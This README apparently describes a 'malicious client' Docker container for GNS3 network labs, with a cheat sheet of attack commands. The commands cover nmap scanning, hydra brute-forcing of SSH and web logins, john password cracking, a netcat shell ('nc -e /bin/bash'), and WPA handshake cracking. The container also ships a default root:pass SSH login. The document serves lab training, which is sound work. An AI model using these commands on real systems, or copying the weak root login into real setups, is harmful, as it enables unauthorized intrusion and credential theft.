# Malicious Client Container

## Overview
This container provides a Ubuntu client with penetration testing and security assessment tools. It's designed to simulate malicious or security testing activities in controlled network environments.

## Features
- Ubuntu 24.04 LTS base image
- SSH access (root:pass)
- Penetration testing tools
- Network scanning and exploitation tools
- Logging enabled (rsyslog)

## Installed Packages
- **SSH**: openssh-server
- **Logging**: rsyslog
- **Network Tools**: net-tools, iproute2, iputils-ping, tcpdump
- **Text Editors**: vim, nano
- **Utilities**: curl, wget, procps
- **Penetration Testing**: nmap, netcat-openbsd, hydra, john, aircrack-ng

## Usage in GNS3

### Starting the Container
1. Import the container into GNS3
2. Connect to network interfaces as needed
3. Start the container

### Accessing the Container
```bash
# SSH access
ssh root@<container_ip>
# Password: pass

# Or use GNS3 console
```

### Manual Service Startup (if needed)
```bash
# Start logging service
rsyslogd

# Start SSH service
/usr/sbin/sshd -D
```

### Penetration Testing Tools

#### Network Scanning
```bash
# Host discovery
nmap -sn <network_range>

# Port scanning
nmap -sS <target_ip>
nmap -sV -sC <target_ip>

# Service enumeration
nmap -sV -p- <target_ip>
```

#### Password Attacks
```bash
# SSH brute force
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<target_ip>

# HTTP form brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt <target_ip> http-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Password cracking
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

#### Network Connectivity
```bash
# Reverse shell
nc -lvp 4444

# Bind shell
nc -e /bin/bash <target_ip> 4444

# File transfer
nc -l -p 1234 < file.txt  # On receiving end
nc <target_ip> 1234 > file.txt  # On sending end
```

#### Wireless Testing
> **Note:** `aircrack-ng` is installed but requires access to a real wireless interface. In a Docker/GNS3 environment you will typically not have a wireless adapter available, so these commands are only useful when the container is run on a host with USB-passthrough or a physical wireless NIC.

```bash
# Monitor mode
airmon-ng start wlan0

# Capture handshake
airodump-ng -c <channel> --bssid <bssid> wlan0mon

# Crack WPA/WPA2
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture.cap
```

### Logging
- System logs: `/var/log/syslog`
- Auth logs: `/var/log/auth.log`
- Custom logs: `/var/log/`

## Security Considerations
⚠️ **WARNING**: This container contains penetration testing tools and should only be used in:
- Controlled lab environments
- Authorized security testing
- Educational purposes
- Your own networks

## Configuration
- SSH is configured to allow root login with password authentication
- All penetration testing tools are pre-installed
- Logging is enabled for audit trails

## Troubleshooting
- If tools don't work, check if they're installed: `which nmap hydra john`
- For network issues, verify interface configuration: `ip addr show`
- Check logs for errors: `tail -f /var/log/syslog`
- Some tools may require additional configuration or wordlists
